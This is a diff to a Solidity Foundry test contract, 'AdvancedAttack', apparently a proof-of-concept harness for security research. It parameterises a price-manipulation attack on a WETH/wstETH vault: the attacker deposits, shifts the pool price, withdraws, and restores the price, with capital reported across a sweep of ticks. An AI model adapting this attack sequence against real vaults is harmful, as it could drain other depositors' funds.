@@ -584,20 +584,23 @@ contract AdvancedAttack is Test {
     function execute(
         int24 rebalanceTick,
         int24 initialTick,
-        int24 shiftedTick
+        int24 shiftedTick,
+        uint256 depositCapital
     ) public {
         fullPriceUpdate(rebalanceTick, deployer);
         fullRebalance(rebalanceTick);
         uint256[] memory tokenAmounts = new uint256[](2);
         tokenAmounts[0] = 10000 * (10**18);
         tokenAmounts[1] = 10000 * (10**18);
-        makeDeposit(tokenAmounts, depositor);
+        makeDeposit(tokenAmounts, depositor, rebalanceTick);
         fullPriceUpdate(initialTick, deployer);
         reportCapital(attacker, initialTick);
         uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(initialTick);
         console2.log("PRICE: ", FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 1 << 96));
         console2.log("INITIAL_LP_PRICE: ", getLpPriceD18(initialTick));
-        makeDeposit(tokenAmounts, attacker);
+        tokenAmounts[0] = depositCapital;
+        tokenAmounts[1] = depositCapital;
+        makeDeposit(tokenAmounts, attacker, initialTick);
         fullPriceUpdate(shiftedTick, attacker);
         withdrawAll(attacker);
         fullPriceUpdate(initialTick, attacker);
@@ -606,7 +609,14 @@ contract AdvancedAttack is Test {
         reportCapital(attacker, initialTick);
     }
 
-    function makeDeposit(uint256[] memory tokenAmounts, address from) public {
+    function makeDeposit(uint256[] memory tokenAmounts, address from, int24 tick) public {
+        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);
+        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 1 << 96);
+        (uint256[] memory tvl, ) = IERC20RootVault(rootVault).tvl();
+        uint256 totalCapital = FullMath.mulDiv(tokenAmounts[0], priceX96, 1 << 96) + tokenAmounts[1];
+        uint256 ratio = FullMath.mulDiv(tokenAmounts[0], 10 ** 9, tokenAmounts[0] + tokenAmounts[1]);
+        tokenAmounts[0] = FullMath.mulDiv(FullMath.mulDiv(totalCapital, ratio, 10 ** 9), 1 << 96, priceX96);
+        tokenAmounts[1] = FullMath.mulDiv(totalCapital, 10 ** 9 - ratio, 10 ** 9);
         mintWeth(from, tokenAmounts[1]);
         mintWsteth(from, tokenAmounts[0]);
         vm.startPrank(from);
@@ -654,11 +664,12 @@ contract AdvancedAttack is Test {
         buildInitialPositions(vm.envUint("width"), nft);
 
         int24 deviation = int24(vm.envInt("deviation"));
+        uint256 attackCapital = vm.envUint("deposit");
         // int24 shift = int24(vm.envInt("shift"));
         for (int24 initialTick = 0; initialTick * 2 <= vm.envInt("width"); initialTick += 10) {
             for (int24 shift = -int24(vm.envInt("width")) * 2; shift <= vm.envInt("width") * 2; shift += 5) {
                 console2.log("NEW ROUND");
-                execute(initialTick + deviation, initialTick, initialTick + shift);
+                execute(initialTick + deviation, initialTick, initialTick + shift, attackCapital);
                 vm.warp(block.timestamp + 12);
             }
         }
